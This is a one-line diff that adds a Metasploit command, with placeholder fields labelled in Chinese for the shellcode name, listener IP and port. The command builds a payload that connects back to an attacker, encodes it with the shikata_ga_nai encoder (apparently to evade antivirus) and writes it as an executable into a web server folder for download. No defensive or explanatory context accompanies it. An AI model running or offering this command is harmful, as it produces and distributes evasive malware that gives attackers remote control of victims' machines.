@@ -1,0 +1,1 @@
+msfpayload shellcode名字 LHOST=IP地址 LPORT=端口号 R | msfencode -e x86/shikata_ga_nai -t exe > /var/www/payload.exe
